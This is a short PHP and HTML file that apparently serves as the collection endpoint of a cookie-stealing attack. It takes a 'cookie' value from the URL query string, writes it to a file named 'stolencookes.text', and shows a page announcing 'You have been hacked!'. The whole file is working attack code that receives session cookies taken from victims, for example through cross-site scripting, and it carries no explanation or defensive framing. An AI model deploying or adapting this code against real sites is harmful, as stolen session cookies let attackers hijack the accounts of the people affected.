<?php 

$cookie = $_GET['cookie'];

file_put_contents('stolencookes.text', $cookie);

?>

<!doctype html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Hacked Off!</title>
    </head>
    <body>
        <h1>You have been hacked!</h1>
    </body>
</html>